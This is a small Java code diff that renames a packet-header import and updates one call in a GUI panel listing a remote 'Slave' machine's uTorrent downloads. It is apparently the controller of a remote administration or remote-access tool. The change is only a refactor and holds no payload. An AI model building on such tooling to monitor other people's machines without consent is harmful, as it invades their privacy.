@@ -15,7 +15,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.utils.IconUtils;
 
 @SuppressWarnings("serial")
@@ -50,7 +50,7 @@ public class PanelControluTorrentDownloads extends PanelControlParent {
 				while (model.getRowCount() > 0) {
 					model.removeRow(0);
 				}
-				sl.addToSendQueue(Header.GET_TORRENTS);
+				sl.addToSendQueue(OutgoingHeader.GET_TORRENTS);
 			}
 		});
 
